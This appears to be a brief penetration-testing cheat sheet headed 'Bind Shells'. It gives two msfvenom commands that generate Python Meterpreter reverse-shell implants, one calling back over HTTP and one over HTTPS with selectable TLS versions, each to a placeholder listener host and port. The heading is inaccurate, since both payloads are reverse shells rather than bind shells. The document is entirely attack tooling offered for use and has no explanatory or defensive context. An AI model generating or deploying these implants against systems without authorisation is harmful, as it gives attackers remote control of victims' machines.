# Bind Shells

## HTTP

```
$ msfvenom -p python/meterpreter_reverse_http lhost=<IP> lport=<PORT> -o implant.py
```

## HTTP via TLS

```
$ msfvenom -p python/meterpreter_reverse_https handlersslcert=<file.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -o implant.py
```